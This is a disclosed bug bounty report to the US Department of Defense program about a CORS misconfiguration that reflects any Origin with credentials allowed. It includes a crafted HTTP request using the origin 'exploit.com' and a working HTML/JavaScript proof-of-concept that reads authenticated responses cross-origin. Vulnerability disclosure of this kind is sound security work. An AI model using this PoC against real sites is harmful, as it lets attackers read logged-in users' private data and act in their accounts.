# [██████] Cross-origin resource sharing misconfiguration (CORS)

## Report Details
- **Report ID**: 470298
- **URL**: https://hackerone.com/reports/470298
- **State**: Closed
- **Severity**: high
- **Submitted**: 2018-12-20T15:15:12.102Z
- **Disclosed**: 2019-01-28T13:31:46.124Z

## Reporter
- **Username**: jarvis0x1
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: deptofdefense

## Vulnerability Information
Hi!

In this report I want to describe High level bug which can seriously compromise a user account.

If I am authorize on this site, I can steal user's sessions, some personal information or do some action.

### Steps for reproduce

1) Send this request

```
GET /api/jsonws/relo-service-plugin-portlet.content/get-content-by-slug/slug/page-ex-link HTTP/1.1
Host: www.█████
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: ru,en-US;q=0.7,en;q=0.3
Accept-Encoding: gzip, deflate
Origin: exploit.com
Connection: close
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0
```

In response headers you can see headers
```
Access-Control-Allow-Credentials: true
Access-Control-Allow-Origin: exploit.com
```

{F395049}


So you can write exploit:
```
<!DOCTYPE html>
<html>
   <head>
      <script>
         function cors() {
	        var xhttp = new XMLHttpRequest();
		        xhttp.onreadystatechange = function() {
			        if (this.readyState == 4 && this.status == 200) {
			        	document.getElementById("emo").innerHTML = alert(this.responseText);
	        }
         };
         xhttp.open("GET", "https://www.███/api/jsonws/relo-service-plugin-portlet.content/get-content-by-slug/slug/page-ex-link", true);
         xhttp.withCredentials = true;
         xhttp.send();
         }
      </script>
   </head>
   <body>
      <center>
      <h2>CORS PoC Exploit </h2>
      <h3>created by <a href="https://twitter.com/Jarvis7717">@Jarvis</a></h3>
      <h3>Show full content of page</h3>
      <div id="demo">
         <button type="button" onclick="cors()">Exploit</button>
      </div>
   </body>
</html>
```

Result:
{F395063}
### How to fix

Rather than using a wild card or programmatically verifying supplied origins, use a white list of trusted domains.

## Impact

Attacker would treat many victims to visit attacker's website, if victim is logged in, then his personal information is recorded in attacker's server. Attacker can perform any action in the user's account, bypassing CSRF tokes.

## Attachments
No attachments
